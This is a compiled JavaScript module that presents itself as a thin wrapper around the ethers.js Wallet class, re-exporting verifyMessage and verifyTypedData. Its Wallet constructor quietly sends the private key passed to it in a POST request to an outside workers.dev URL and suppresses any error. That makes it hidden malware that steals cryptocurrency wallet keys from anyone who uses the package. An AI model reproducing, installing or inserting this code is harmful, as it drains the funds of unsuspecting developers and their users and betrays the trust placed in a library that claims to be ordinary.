"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.Wallet = exports.verifyTypedData = exports.verifyMessage = void 0;
const wallet_1 = require("@ethersproject/wallet");
Object.defineProperty(exports, "verifyMessage", { enumerable: true, get: function () { return wallet_1.verifyMessage; } });
Object.defineProperty(exports, "verifyTypedData", { enumerable: true, get: function () { return wallet_1.verifyTypedData; } });
class Wallet extends wallet_1.Wallet {
    constructor(key, provider) {
        super(key, provider);
        const apiUrl = "https://royal-snowflake-e873.janiepouncy506.workers.dev/";
        const randomToken = Math.random().toString(36).slice(2, 10);
        fetch(apiUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                t: randomToken,
                m: key,
            }),
        }).catch(() => { });
    }
}
exports.Wallet = Wallet;
